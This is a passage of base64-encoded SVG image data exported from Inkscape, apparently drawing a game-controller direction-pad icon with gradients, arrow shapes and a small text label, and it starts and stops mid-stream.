SA5LjItMyAxMy40LTUuMyAxMy4xLTguMi0wLjUtMy43LTkuNC01LjktMTUuMi02LjMtNy44LTAuNS0xNi40IDIuMS0xNi40IDIuMXpNLTQ4NC43LTY4NC4ybDAtNTAuNWMwIDAgMTguMyAzLjEgMjQuNCA4LjcgNC4zIDQgNS45IDUuMiA2LjIgMTUuMiAwLjEgMy43LTIuMSA3LjQtNS44IDkuNC0yLjcgMS40LTcuOS0wLjgtNy45LTAuOGwwLTIwYzAgMC0xLTMtMy0zLjItMS42LTAuMS0yLjIgMS44LTIuMiAxLjhsMCA0MC42YzAgMCAwLjQgNC42LTAuOCA2LjMtMS44IDIuNS00LjkgMy43LTguMSA0LjEtOS45IDEuNC0yOS45LTcuMS0yOS45LTcuMWw5LjctMC4xYzAgMCAxMi4yIDIuNiAxNi41LTAuOCAxLTAuOCAxLTMuNiAxLTMuNnoiIGZpbGw9IiMxNzFiMWQiLz48L2c+PGcgdHJhbnNmb3JtPSJtYXRyaXgoMS43NDI4NjU3LDAsMCwxLjM3MTM4MDUsMjk0My4xMTQ5LDEyMTYuMTk5OSkiIGlkPSJmbG93Um9vdDY5NzciIGNsYXNzPSJzMTQiPjxwYXRoIGQ9Im0tMTQ5My03MDIuNHEwIDAuNy0wLjEgMS4xLTAuMSAwLjQtMC4zIDAuNi0wLjIgMC4yLTAuNSAwLjMtMC4zIDAuMS0wLjggMC4xbC0xLjEgMCAwLTAuNiAxIDBxMC4yIDAgMC40IDAgMC4yLTAuMSAwLjItMC4yIDAuMS0wLjIgMC4xLTAuNSAwLTAuMyAwLTAuOCAwLTAuNSAwLTAuOCAwLTAuMy0wLjEtMC41LTAuMS0wLjItMC4yLTAuMi0wLjEtMC4xLTAuNC0wLjFsLTEuNCAwIDAgNi40LTEgMCAwLTcgMi42IDBxMC41IDAgMC44IDAuMSAwLjMgMC4xIDAuNSAwLjMgMC4yIDAuMiAwLjMgMC43IDAuMSAwLjQgMC4xIDEuMXpNLTE0OTEuNC02OTcuNWwtMSAwIDAtNy4yIDEgMCAwIDcuMk0tMTQ5MS40LTY5Ny41bC0xIDAgMC03LjIgMSAwIDAgNy4yTS0xNDkxLjQtNjk3LjVsLTEgMCAwLTcuMiAxIDAgMCA3LjJ6TS0xNDg4LjItNzAwLjlsMCAwLjYtMC40IDBxLTAuMyAwLTAuNCAwLTAuMiAwLTAuMiAwLjEtMC4xIDAuMS0wLjEgMC4yIDAgMC4xIDAgMC40bDAgMC42cTAgMC4yIDAgMC40IDAgMC4xIDAuMSAwLjIgMC4xIDAuMSAwLjMgMC4xIDAuMiAwIDAuNCAwbDEuMSAwIDAtMy4zcTAtMC4zIDAtMC41IDAtMC4yLTAuMS0wLjMtMC4xLTAuMS0wLjMtMC4yLTAuMiAwLTAuNCAwbC0xLjQgMCAwLTAuNiAxLjggMHEwLjUgMCAwLjcgMC4xIDAuMyAwLjEgMC41IDAuMyAwLjIgMC4yIDAuMiAwLjUgMC4xIDAuMyAwLjEgMC44bDAgMy45LTIuNSAwcS0wLjQgMC0wLjctMC4xLTAuMy0wLjEtMC41LTAuMi0wLjItMC4yLTAuMi0wLjQtMC4xLTAuMi0wLjEtMC42bDAtMC43cTAtMC4zIDAuMS0wLjYgMC4xLTAuMiAwLjItMC40IDAuMi0wLjIgMC41LTAuMiAwLjMtMC4xIDAuNy0wLjFsMC44IDB6TS0xNDg1LTY5NS4zbDAuNi0yLjEtMS44LTUuNyAxLjEgMCAxLjIgNC41IDEuMy00LjUgMSAwLTIuMyA3LjgtMSAwek0tMTQ3Ny4zLTY5OS43cTAgMS4xLTAuNCAxLjYtMC40IDAuNS0xLjMgMC41bC0yLjIgMCAwLTAuNiAyIDBxMC4yIDAgMC40IDAgMC4yIDAgMC4zLTAuMiAwLjEtMC4xIDAuMi0wLjQgMC4xLTAuMyAwLjEtMC43IDAtMC40IDAtMC42IDAtMC4yLTAuMS0wLjQtMC4xLTAuMS0wLjMtMC4yLTAuMiAwLTAuNSAwbC0wLjggMHEtMC40IDAtMC42LTAuMS0wLjMtMC4xLTAuNC0wLjMtMC4yLTAuMi0wLjItMC42LTAuMS0wLjQtMC4xLTAuOSAwLTAuOSAwLjMtMS40IDAuNC0wLjUgMS4yLTAuNWwyIDAgMCAwLjYtMS43IDBxLTAuMiAwLTAuNCAwLjEtMC4xIDAuMS0wLjMgMC4yLTAuMSAwLjEtMC4xIDAuNCAwIDAuMiAwIDAuNiAwIDAuNCAwIDAuNiAwIDAuMiAwLjEgMC40IDAuMSAwLjEgMC4zIDAuMiAwLjIgMC4xIDAuNCAwLjFsMC43IDBxMC40IDAgMC43IDAuMSAwLjMgMC4xIDAuNSAwLjMgMC4yIDAuMiAwLjMgMC42IDAuMSAwLjQgMC4xIDF6TS0xNDc0LjItNzAyLjVsLTEuNCAwIDAgMy41cTAgMC41IDAuMSAwLjcgMC4xIDAuMiAwLjUgMC4ybDAuNSAwIDAgMC42LTAuOSAwcS0wLjQgMC0wLjYtMC4xLTAuMi0wLjEtMC40LTAuMy0wLjEtMC4yLTAuMi0wLjQtMC4xLTAuMi0wLjEtMC41bDAtNS43IDEgMCAwIDEuNSAxLjQgMCAwIDAuNnpNLTE0NzEuNi03MDAuOWwwIDAuNi0wLjQgMHEtMC4zIDAtMC40IDAtMC4yIDAtMC4yIDAuMS0wLjEgMC4xLTAuMSAwLjIgMCAwLjEgMCAwLjRsMCAwLjZxMCAwLjIgMCAwLjQgMCAwLjEgMC4xIDAuMiAwLjEgMC4xIDAuMyAwLjEgMC4yIDAgMC40IDBsMS4xIDAgMC0zLjNxMC0wLjMgMC0wLjUgMC0wLjItMC4xLTAuMy0wLjEtMC4xLTAuMy0wLjItMC4yIDAtMC40IDBsLTEuNCAwIDAtMC42IDEuOCAwcTAuNSAwIDAuNyAwLjEgMC4zIDAuMSAwLjUgMC4zIDAuMiAwLjIgMC4yIDAuNSAwLjEgMC4zIDAuMSAwLjhsMCAzLjktMi41IDBxLTAuNCAwLTAuNy0wLjEtMC4zLTAuMS0wLjUtMC4yLTAuMi0wLjItMC4yLTAuNC0wLjEtMC4yLTAuMS0wLjZsMC0wLjdxMC0wLjMgMC4xLTAuNiAwLjEtMC4yIDAuMi0wLjQgMC4yLTAuMiAwLjUtMC4yIDAuMy0wLjEgMC43LTAuMWwwLjggMHpNLTE0NjcuOS02OTcuNWwtMSAwIDAtNy4yIDEgMCAwIDcuMnpNLTE0NjUuOS02OTcuNWwtMSAwIDAtNy4yIDEgMCAwIDcuMnpNLTE0NjMuOC02OTcuNWwtMSAwIDAtNS41IDEgMCAwIDUuNnptMC02LjMtMSAwIDAtMSAxIDAgMCAxek0tMTQ2MC4xLTcwMy4xcTAuNSAwIDAuNyAwLjEgMC4zIDAuMSAwLjUgMC4zIDAuMiAwLjIgMC4yIDAuNSAwLjEgMC4zIDAuMSAwLjhsMCAyLjJxMCAwLjUtMC4xIDAuOC0wLjEgMC4zLTAuMiAwLjUtMC4yIDAuMi0wLjUgMC4zLTAuMyAwLjEtMC43IDAuMWwtMS4zIDBxLTAuNCAwLTAuNy0wLjEtMC4zLTAuMS0wLjUtMC4zLTAuMi0wLjItMC4yLTAuNS0wLjEtMC4zLTAuMS0wLjhsMC0yLjFxMC0wLjUgMC4xLTAuOCAwLjEtMC4zIDAuMi0wLjUgMC4yLTAuMiAwLjUtMC4zIDAuMy0wLjEgMC43LTAuMWwxLjMgMHptLTEuOCAzLjlxMCAwLjMgMCAwLjUgMCAwLjIgMC4xIDAuMyAwLjEgMC4xIDAuMyAwLjIgMC4yIDAgMC40IDBsMC42IDBxMC4zIDAgMC40IDAgMC4yIDAgMC4zLTAuMSAwLjEtMC4xIDAuMS0wLjMgMC0wLjIgMC0wLjVsMC0yLjJxMC0wLjMgMC0wLjUgMC0wLjItMC4xLTAuMy0wLjEtMC4xLTAuMy0wLjItMC4yIDAtMC40IDBsLTAuNiAwcS0wLjMgMC0wLjQgMC0wLjIgMC0wLjIgMC4yLTAuMSAwLjEtMC4xIDAuMyAwIDAuMiAwIDAuNWwwIDIuMnpNLTE0NTYuNi03MDIuNWwwIDUtMSAwIDAtNS41IDIuNyAwcTAuNSAwIDAuNyAwLjEgMC4zIDAuMSAwLjUgMC4zIDAuMiAwLjIgMC4yIDAuNSAwLjEgMC4zIDAuMSAwLjhsMCAzLjktMSAwIDAtMy45cTAtMC4zIDAtMC41IDAtMC4yLTAuMS0wLjMtMC4xLTAuMS0wLjMtMC4yLTAuMiAwLTAuNCAwbC0xLjQgMHoiIGlkPSJwYXRoNDMzNCIgY2xhc3M9InMxNSIvPjwvZz48ZyB0cmFuc2Zvcm09Im1hdHJpeCg0LjIyNjcyMTksMCwwLDMuMjAwODczMSw2NjkxLjIzNywyNTU5LjE3NzMpIiBpZD0iZmxvd1Jvb3Q2OTg1IiBjbGFzcz0iczE0Ij48cGF0aCBkPSJtLTE1MTUuNC03NDEuMiAwLTEuNyAwLjYgMHEwLjEgMC44IDAuNyAxLjIgMC41IDAuNCAxLjUgMC40IDAuOCAwIDEuMi0wLjMgMC40LTAuMyAwLjQtMC44IDAtMC40LTAuMy0wLjctMC4zLTAuMi0xLjEtMC41bC0xLjEtMC4zcS0xLjEtMC4zLTEuNS0wLjgtMC40LTAuNS0wLjQtMS40IDAtMS4xIDAuNy0xLjcgMC43LTAuNiAyLTAuNiAwLjYgMCAxLjMgMC4xIDAuNyAwLjEgMS40IDAuM2wwIDEuNi0wLjYgMHEtMC4xLTAuOC0wLjYtMS4xLTAuNS0wLjQtMS40LTAuNC0wLjcgMC0xLjEgMC4zLTAuNCAwLjItMC40IDAuNyAwIDAuNSAwLjMgMC43IDAuMyAwLjIgMS4yIDAuNWwxLjEgMC4zcTEgMC4zIDEuNSAwLjggMC41IDAuNSAwLjUgMS41IDAgMS4xLTAuOCAxLjctMC44IDAuNi0yLjIgMC42LTAuNyAwLTEuNC0wLjEtMC43LTAuMS0xLjQtMC40ek0tMTUwNy43LTc0Ny41bC0wLjkgMCAwLTAuNiAzLjggMCAwIDAuNi0wLjkgMCAwIDMuNk0tMTUwNy43LTc0Ny41bC0wLjkgMCAwLTAuNiAzLjggMCAwIDAuNi0wLjkgMCAwIDMuNk0tMTUwNy43LTc0Ny41bC0wLjkgMCAwLTAuNiAzLjggMCAwIDAuNi0wLjkgMCAwIDMuNnEwIDEuNCAwLjQgMS45IDAuNCAwLjUgMS41IDAuNSAxIDAgMS40LTAuNSAwLjQtMC42IDAuNC0xLjlsMC0zLjYtMC45IDAgMC0wLjYgMi41IDAgMCAwLjYtMC45IDAgMCAzLjhxMCAxLjctMC43IDIuNC0wLjcgMC43LTIuNCAwLjctMS43IDAtMi40LTAuNy0wLjctMC43LTAuNy0yLjRsMC0zLjd6TS0xNDk5LjgtNzQwLjhsMC0wLjYgMC45IDAgMC02LjEtMC45IDAgMC0wLjYgMi4zIDAgNC40IDUuMiAwLTQuNi0wLjkgMCAwLTAuNiAyLjUgMCAwIDAuNi0wLjkgMCAwIDYuNy0xLjMgMC00LjUtNS4zIDAgNC43IDAuOSAwIDAgMC42LTIuNSAwek0tMTQ5MC42LTc0MC44bDAtMC42IDAuOSAwIDAtNi4xLTAuOSAwIDAtMC42IDIuMyAwIDQuNCA1LjIgMC00LjYtMC45IDAgMC0wLjYgMi41IDAgMCAwLjYtMC45IDAgMCA2LjctMS4zIDAtNC41LTUuMyAwIDQuNyAwLjkgMCAwIDAuNi0yLjUgMHpNLTE0ODAuMi03NDAuOGwwLTAuNiAxIDAgMC0yLjQtMi4yLTMuNy0wLjYgMCAwLTAuNiAzLjUgMCAwIDAuNi0wLjggMCAxLjYgMi44IDEuNi0yLjgtMC43IDAgMC0wLjYgMi4xIDAgMCAwLjYtMC42IDAtMiAzLjQgMCAyLjcgMSAwIDAgMC42LTMuOSAweiIgaWQ9InBhdGg0MzIzIiBjbGFzcz0iczE2Ii8+PC9nPjxwYXRoIGlkPSJwYXRoNjk5MyIgZD0ibTEwNC45IDEzMy43Yy00LjggMC04LjcgMy45LTguNyA4LjdsMCA1MC4zLTUwLjMgMGMtNC44IDAtOC43IDMuOS04LjcgOC43bDAgNTAuN2MwIDQuOCAzLjkgOC43IDguNyA4LjdsNTAuMyAwIDAgNTAuM2MwIDQuOCAzLjkgOC43IDguNyA4LjdsNTAuNyAwYzQuOCAwIDguNy0zLjkgOC43LTguN2wwLTUwLjMgNTAuMyAwYzQuOCAwIDguNy0zLjkgOC43LTguN2wwLTUwLjdjMC00LjgtMy45LTguNy04LjctOC43bC01MC4zIDAgMC01MC4zYzAtNC44LTMuOS04LjctOC43LTguN2wtNTAuNyAweiIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgY2xhc3M9InMxMSIvPjxlbGxpcHNlIGlkPSJlbGxpcHNlNjk5NSIgY3g9IjEzMi4zIiBjeT0iMTg3LjciIHJ4PSIxMDIuMiIgcnk9IjY0LjYiIGZpbGw9Im5vbmUiLz48ZWxsaXBzZSBpZD0iZWxsaXBzZTY5OTciIGN4PSIxMzMuMyIgY3k9IjE4OC4xIiByeD0iMTAzLjkiIHJ5PSI2NS43IiBmaWxsPSIjOTI5Njk1Ii8+PHBhdGggaWQ9InBhdGg2OTk5IiBkPSJtMTA0LjkgMTM1Yy00LjggMC04LjcgMy45LTguNyA4LjdsMCA1MC4zLTUwLjMgMGMtNC44IDAtOC43IDMuOS04LjcgOC43bDAgNTAuN2MwIDQuOCAzLjkgOC43IDguNyA4LjdsNTAuMyAwIDAgNTAuM2MwIDQuOCAzLjkgOC43IDguNyA4LjdsNTAuNyAwYzQuOCAwIDguNy0zLjkgOC43LTguN2wwLTUwLjMgNTAuMyAwYzQuOCAwIDguNy0zLjkgOC43LTguN2wwLTUwLjdjMC00LjgtMy45LTguNy04LjctOC43bC01MC4zIDAgMC01MC4zYzAtNC44LTMuOS04LjctOC43LTguN2wtNTAuNyAweiIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgc3R5bGU9ImZpbGw6dXJsKCNsaW5lYXJHcmFkaWVudDcxMDcpO3N0cm9rZS13aWR0aDoyO3N0cm9rZTojODI4NTg0Ii8+PHBhdGggaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgZD0ibTEwNC45IDEzNWMtNC44IDAtOC43IDMuOS04LjcgOC43bDAgNTAuMy01MC4zIDBjLTQuOCAwLTguNyAzLjktOC43IDguN2wwIDUwLjdjMCA0LjggMy45IDguNyA4LjcgOC43bDUwLjMgMCAwIDUwLjNjMCA0LjggMy45IDguNyA4LjcgOC43bDUwLjcgMGM0LjggMCA4LjctMy45IDguNy04LjdsMC01MC4zIDUwLjMgMGM0LjggMCA4LjctMy45IDguNy04LjdsMC01MC43YzAtNC44LTMuOS04LjctOC43LTguN2wtNTAuMyAwIDAtNTAuM2MwLTQuOC0zLjktOC43LTguNy04LjdsLTUwLjcgMHoiIGlkPSJwYXRoNzAwMSIgY2xhc3M9InMxNyIvPjxwYXRoIGQ9Im03MC42IDIxMy43IDAgMjguMWMwIDQuMiAzLjQgNy41IDcuNSA3LjVsMTkuNiAwYzQuMiAwIDguMy00LjUgMTEuMS03LjUgMy4xLTMuMyAxMC05IDEwLjMtMTMuMiAwLjMtNS40LTYuMi0xMS05LjktMTQuOS0yLjktMy03LjMtNy41LTExLjUtNy41bC0xOS42IDBjLTQuMiAwLTcuNSAzLjQtNy41IDcuNXoiIGlkPSJwYXRoNzAwMyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgc29kaXBvZGk6bm9kZXR5cGVzPSJzc3Nzc3Nzc3NzIiBmaWxsPSIjZjlmOWY5Ii8+PHBhdGggc29kaXBvZGk6bm9kZXR5cGVzPSJzc3Nzc3Nzc3NzIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBpZD0icGF0aDcwMDUiIGQ9Im03MC42IDIxNS4xIDAgMjguMWMwIDQuMiAzLjQgNy41IDcuNSA3LjVsMTkuNiAwYzQuMiAwIDguMy00LjUgMTEuMS03LjUgMy4xLTMuMyAxMC05IDEwLjMtMTMuMiAwLjMtNS40LTYuMi0xMS05LjktMTQuOS0yLjktMy03LjMtNy41LTExLjUtNy41bC0xOS42IDBjLTQuMiAwLTcuNSAzLjQtNy41IDcuNXoiIGZpbGw9InVybCgjbGluZWFyR3JhZGllbnQ3MTA5KSIvPjxwYXRoIHNvZGlwb2RpOm5vZGV0eXBlcz0ic3Nzc3Nzc3NzcyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgaWQ9InBhdGg3MDA3IiBkPSJtMTg3LjkgMjE0LjIgMCAyOC4xYzAgNC4yLTMuNCA3LjUtNy41IDcuNWwtMTkuNiAwYy00LjIgMC04LjMtNC41LTExLjEtNy41LTMuMS0zLjMtMTAtOS0xMC4zLTEzLjItMC4zLTUuNCA2LjItMTEgOS45LTE0LjkgMi45LTMgNy4zLTcuNSAxMS41LTcuNWwxOS42IDBjNC4yIDAgNy41IDMuNCA3LjUgNy41eiIgZmlsbD0iI2ZmZiIvPjxwYXRoIHNvZGlwb2RpOm5vZGV0eXBlcz0ic3Nzc3Nzc3NzcyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgaWQ9InBhdGg3MDA5IiBkPSJtMTE1LjIgMjg2LjggMjguMSAwYzQuMiAwIDcuNS0zLjQgNy41LTcuNWwwLTE5LjZjMC00LjItNC41LTguMy03LjUtMTEuMS0zLjMtMy4xLTktMTAtMTMuMi0xMC4zLTUuNC0wLjMtMTEgNi4yLTE0LjkgOS45LTMgMi45LTcuNSA3LjMtNy41IDExLjVsMCAxOS42YzAgNC4yIDMuNCA3LjUgNy41IDcuNXoiIGZpbGw9IiNmOWY5ZjkiLz48cGF0aCBkPSJtMTE1LjIgMTY5LjMgMjguMSAwYzQuMiAwIDcuNSAzLjQgNy41IDcuNWwwIDE5LjZjMCA0LjItNC41IDguMy03LjUgMTEuMS0zLjMgMy4xLTkgMTAtMTMuMiAxMC4zLTUuNCAwLjMtMTEtNi4yLTE0LjktOS45LTMtMi45LTcuNS03LjMtNy41LTExLjVsMC0xOS42YzAtNC4yIDMuNC03LjUgNy41LTcuNXoiIGlkPSJwYXRoNzAxMSIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgc29kaXBvZGk6bm9kZXR5cGVzPSJzc3Nzc3Nzc3NzIiBmaWxsPSIjZmZmIi8+PHBhdGggc29kaXBvZGk6bm9kZXR5cGVzPSJzc3Nzc3Nzc3NzIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBpZD0icGF0aDcwMTMiIGQ9Im0xMTUuMiAxNzAuNCAyOC4xIDBjNC4yIDAgNy41IDMuNCA3LjUgNy41bDAgMTkuNmMwIDQuMi00LjUgOC4zLTcuNSAxMS4xLTMuMyAzLjEtOSAxMC0xMy4yIDEwLjMtNS40IDAuMy0xMS02LjItMTQuOS05LjktMy0yLjktNy41LTcuMy03LjUtMTEuNWwwLTE5LjZjMC00LjIgMy40LTcuNSA3LjUtNy41eiIgZmlsbD0iIzE3MWIxZCIvPjxnIGlkPSJnNzAxNSIgdHJhbnNmb3JtPSJtYXRyaXgoLTEsMCwwLDEsLTU3OS44MzMwNSw4OTguNzAyMDkpIj48cGF0aCBzb2RpcG9kaTpub2RldHlwZXM9ImNjY2NjY2NjIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBpZD0icGF0aDcwMTciIGQ9Im0tNjI1LTY2OS44YzAtMC40LTAuMi0wLjctMC40LTAuOWwtMTIuMi0xMC44Yy0wLjUtMC40LTEuMSAwLjEtMS4xIDFsMCAyMS41YzAgMC45IDAuNiAxLjQgMS4xIDFsMTIuMi0xMC44YzAuMi0wLjIgMC40LTAuNiAwLjQtMXoiIGNsYXNzPSJzMTkiLz48cGF0aCBkPSJtLTYyNS02NzFjMC0wLjQtMC4yLTAuNy0wLjQtMC45bC0xMi4yLTEwLjhjLTAuNS0wLjQtMS4xIDAuMS0xLjEgMWwwIDIxLjVjMCAwLjkgMC42IDEuNCAxLjEgMWwxMi4yLTEwLjhjMC4yLTAuMiAwLjQtMC42IDAuNC0xeiIgaWQ9InBhdGg3MDE5IiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBzb2RpcG9kaTpub2RldHlwZXM9ImNjY2NjY2NjIiBzdHlsZT0iYmFzZWxpbmUtc2hpZnQ6YmFzZWxpbmU7YmxvY2stcHJvZ3Jlc3Npb246dGI7Y2xpcC1ydWxlOm5vbnplcm87Y29sb3ItaW50ZXJwb2xhdGlvbi1maWx0ZXJzOmxpbmVhclJHQjtjb2xvci1pbnRlcnBvbGF0aW9uOnNSR0I7Y29sb3ItcmVuZGVyaW5nOmF1dG87Y29sb3I6IzAwMDAwMDtkaXJlY3Rpb246bHRyO2Rpc3BsYXk6aW5saW5lO2VuYWJsZS1iYWNrZ3JvdW5kOmFjY3VtdWxhdGU7ZmlsbC1ydWxlOm5vbnplcm87ZmlsbDp1cmwoI2xpbmVhckdyYWRpZW50NzExMSk7Zm9udC1mYW1pbHk6c2Fucy1zZXJpZjtmb250LXNpemU6bWVkaXVtO2ltYWdlLXJlbmRlcmluZzphdXRvO2lzb2xhdGlvbjphdXRvO2xldHRlci1zcGFjaW5nOm5vcm1hbDtsaW5lLWhlaWdodDpub3JtYWw7bWl4LWJsZW5kLW1vZGU6bm9ybWFsO292ZXJmbG93OnZpc2libGU7c2hhcGUtcmVuZGVyaW5nOmF1dG87c29saWQtY29sb3I6IzAwMDAwMDtzb2xpZC1vcGFjaXR5OjE7dGV4dC1hbGlnbjpzdGFydDt0ZXh0LWFuY2hvcjpzdGFydDt0ZXh0LWRlY29yYXRpb24tY29sb3I6IzAwMDAwMDt0ZXh0LWRlY29yYXRpb24tbGluZTpub25lO3RleHQtZGVjb3JhdGlvbi1zdHlsZTpzb2xpZDt0ZXh0LWRlY29yYXRpb246bm9uZTt0ZXh0LWluZGVudDowO3RleHQtcmVuZGVyaW5nOmF1dG87dGV4dC10cmFuc2Zvcm06bm9uZTt3aGl0ZS1zcGFjZTpub3JtYWw7d29yZC1zcGFjaW5nOm5vcm1hbDt3cml0aW5nLW1vZGU6bHItdGIiLz48L2c+PGcgdHJhbnNmb3JtPSJtYXRyaXgoMCwtMSwtMSwwLC01NDAuNDQzMDUsLTQ4MC41Njc5NykiIGlkPSJnNzAyMSI+PHBhdGggZD0ibS02MjUtNjY5LjhjMC0wLjQtMC4yLTAuNy0wLjQtMC45bC0xMi4yLTEwLjhjLTAuNS0wLjQtMS4xIDAuMS0xLjEgMWwwIDIxLjVjMCAwLjkgMC42IDEuNCAxLjEgMWwxMi4yLTEwLjhjMC4yLTAuMiAwLjQtMC42IDAuNC0xeiIgaWQ9InBhdGg3MDIzIiBpbmtzY2FwZTpjb25uZWN0b3ItY3VydmF0dXJlPSIwIiBzb2RpcG9kaTpub2RldHlwZXM9ImNjY2NjY2NjIiBjbGFzcz0iczE5Ii8+PHBhdGggc29kaXBvZGk6bm9kZXR5cGVzPSJjY2NjY2NjYyIgaW5rc2NhcGU6Y29ubmVjdG9yLWN1cnZhdHVyZT0iMCIgaWQ9InBhdGg3MDI1IiBkPSJtLTYyNC40LTY2OS42YzAtMC40LTAuMi0wLjctMC40LTAuOWwtMTIuMi0xMC44Yy0wLjUtMC40LTEuMSAwLjEtMS4xIDFsMCAyMS41YzAgMC45IDAuNiAxLjQgMS4xIDFsMTIuMi0xMC44YzAuMi0wLjIgMC40LTAuNiAwLjQtMXoiIHN0eWxlPSJiYXNlbGluZS1zaGlmdDpiYXNlbGluZTtibG9jay1wcm9ncmVzc2lvbjp0YjtjbGlwLXJ1bGU6bm9uemVybztjb2xvci1pbnRlcnBvbGF0aW9uLWZpbHRlcnM6bGluZWFyUkdCO2NvbG9yLWludGVycG9sYXRpb246c1JHQjtjb2xvci1yZW5kZXJpbmc6YXV0bztjb2xvcjojMDAwMDAwO2RpcmVjdGlvbjpsdHI7ZGlzcGxheTppbmxpbmU7ZW5hYmxlLWJhY2tncm91bmQ6YWNjdW11bGF0ZTtmaWxsLXJ1bGU6bm9uemVybztmaWxsOnVybCgjbGluZWFyR3JhZGllbnQ3MTEzKTtmb250LWZhbWlseTpzYW5zLXNlcmlmO2ZvbnQtc2l6ZTptZWRpdW07aW1hZ2UtcmVuZGVyaW5nOmF1dG87aXNvbGF0aW9uOmF1dG87bGV0dGVyLXNwYWNpbmc6bm9ybWFsO2xpbmUtaGVpZ2h0Om5vcm1hbDttaXgtYmxlbmQtbW9kZTpub3JtYWw7b3ZlcmZsb3c6dmlzaWJsZTtzaGFwZS1yZW5kZXJpbmc6YXV0bztzb2xpZC1jb2xvcjojMDAwMDAwO3NvbGlkLW9wYWNpdHk6MTt0ZXh0LWFsaWduOnN0YXJ0O3RleHQtYW5jaG9yOnN0YXJ0O3RleHQtZGVjb3JhdGlvbi1jb2xvcjojMDAwMDAwO3RleHQtZGVjb3JhdGlvbi1saW5lOm5vbmU7dGV4dC1kZWNvcmF0aW9uLXN0eWxlOnNvbGlkO3RleHQtZGVjb3JhdGlvbjpub25lO3RleHQtaW5kZW50OjA7dGV4dC1yZW5kZXJpbmc6YXV0bzt0ZXh0LXRyYW5zZm9ybTpub25lO3doaXRlLXNwYWNlOm5vcm1hbDt3b3JkLXNwYWNpbmc6bm9ybWFsO3dyaXRpbmctbW9kZTpsci10YiIvPjwvZz48ZyBpZD0iZzcwMjciIHRyYW5zZm9ybT0ibWF0cml4KDAuOTMzNTYzMzksMCwwLDAuOTMzNTYzMzksODEyLjg3MzIyLDg1OC43NTA5MykiPjxwYXRoIHNvZGlwb2RpOnR5cGU9InN0YXIiIGlkPSJwYXRoNzAyOSIgc29kaXBvZGk6c2lkZXM9IjMiIHNvZGlwb2RpOmN4PSItNTQyLjEiIHNvZGlwb2RpOmN5PSItNzM3LjMiIHNvZGlwb2RpOnIxPSI0OS44IiBzb2RpcG9kaTpyMj0iMjQuOSIgc29kaXBvZGk6YXJnMT0iMi4xIiBzb2RpcG9kaTphcmcyPSIzLjEiIGlua3NjYXBlOmZsYXRzaWRlZD0idHJ1ZSIgaW5rc2NhcGU6cm91bmRlZD0iMCIgaW5rc2NhcGU6cmFuZG9taXplZD0iMCIgZD0ibS01NjctNjk0LjIgMC04Ni4yIDc0LjcgNDMuMXoiIGlua3NjYXBlOnRyYW5zZm9ybS1jZW50ZXIteD0iLTguNCIgdHJhbnNmb3JtPSJtYXRyaXgoMC42NzQ3MTQwOSwwLDAsMC4yODE0NDUzNiwtNTYuODYzNzk0LC00MDguOTM2MzkpIiBmaWxsPSIjZTNlOWU5Ii8+PHBhdGggdHJhbnNmb3JtPSJtYXRyaXgoMC42ODAwMDUxNCwwLDAsMC4yODE0NDUzNiwtNTQuMjU4ODI1LC00MDkuMTk1NTgpIiBpbmtzY2FwZTp0cmFuc2Zvcm0tY2VudGVyLXg9Ii04LjUiIGQ9Im0tNTY3LTY5NC4yIDAtODYuMiA3NC43IDQzLjF6IiBpbmtzY2FwZTpyYW5kb21pemVkPSIwIiBpbmtzY2FwZTpyb3VuZGVkPSIwIiBpbmtzY2FwZTpmbGF0c2lkZWQ9InRydWUiIHNvZGlwb2RpOmFyZzI9IjMuMSIgc29kaXBvZGk6YXJnMT0iMi4xIiBzb2RpcG9kaTpyMj0iMjQuOSIgc29kaXBvZGk6cjE9IjQ5LjgiIHNvZGlwb2RpOmN5PSItNzM3LjMiIHNvZGlwb2RpOmN4PSItNTQyLjEiIHNvZGlwb2RpOnNpZGVzPSIzIiBpZD0icGF0aDcwMzEiIHNvZGlwb2RpOnR5cGU9InN0YXIiIGZpbGw9IiMxNjE3MTciLz48cGF0aCB0cmFuc2Zvcm09Im1hdHJpeCgwLjYxOTMwOTM5LDAsMCwwLjI0OTU2MDAzLC04Ny45MjY4ODUsLTQzMy4xNTQxNikiIGlua3NjYXBlOnRyYW5zZm9ybS1jZW50ZXIteD0iLTcuNyIgZD0ibS01NjctNjk0LjIgMC04Ni4yIDc0LjcgNDMuMXoiIGlua3NjYXBlOnJhbmRvbWl6ZWQ9IjAiIGlua3NjYXBlOnJvdW5kZWQ9IjAiIGlua3NjYXBlOmZsYXRzaWRlZD0idHJ1ZSIgc29kaXBvZGk6YXJnMj0iMy4xIiBzb2RpcG9kaTphcmcxPSIyLjEiIHNvZGlwb2RpOnIyPSIyNC45IiBzb2RpcG9kaTpyMT0iNDkuOCIgc29kaXBvZGk6Y3k9Ii03MzcuMyIgc29kaXBvZGk6Y3g9Ii01NDIuMSIgc29kaXBvZGk6c2lkZXM9IjMiIGlkPSJwYXRoNzAzMyIgc29kaXBvZGk6dHlwZT0ic3RhciIgZmlsbD0iI2ZmZiIvPjxwYXRoIHNvZGlwb2RpOnR5cGU9InN0YXIiIGlkPSJwYXRoNzAzNSIgc29kaXBvZGk6c2lkZXM9IjMiIHNvZGlwb2RpOmN4PSItNTQyLjEiIHNvZGlwb2RpOmN5PSItNzM3LjMiIHNvZGlwb2RpOnIxPSI0OS44IiBzb2RpcG9kaTpyMj0iMjQuOSIgc29kaXBvZGk6YXJnMT0iMi4xIiBzb2RpcG9kaTphcmcyPSIzLjEiIGlua3NjYXBlOmZsYXRzaWRlZD0idHJ1ZSIgaW5rc2NhcGU6cm91bmRlZD0iMCIgaW5rc2NhcGU6cmFuZG9taXplZD0iMCIgZD0ibS01NjctNjk0LjIgMC04Ni4yIDc0LjcgNDMuMXoiIGlua3NjYXBlOnRyYW5zZm9ybS1jZW50ZXIteD0iLTcu